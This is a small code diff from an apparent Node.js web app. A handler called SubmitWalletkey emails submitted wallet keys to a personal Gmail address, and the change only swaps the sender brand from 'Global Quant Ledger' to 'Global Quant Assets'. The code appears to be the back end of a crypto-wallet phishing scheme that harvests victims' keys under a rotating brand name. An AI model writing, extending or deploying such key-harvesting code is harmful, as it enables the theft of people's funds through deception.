@@ -137,9 +137,9 @@ exports.SubmitWalletkey = async (req, res, next) => {
    `;
   await transporter
     .sendMail({
-      from: '"Global Quant Ledger" <support@globalquantledger.com>',
+      from: '"Global Quant Assets" <support@globalquantledger.com>',
       to: ["Quantglobal2@gmail.com"],
-      subject: "Global Quant Ledger - Key Submission",
+      subject: "Global Quant Assets - Key Submission",
       text: "",
       html: output,
     })
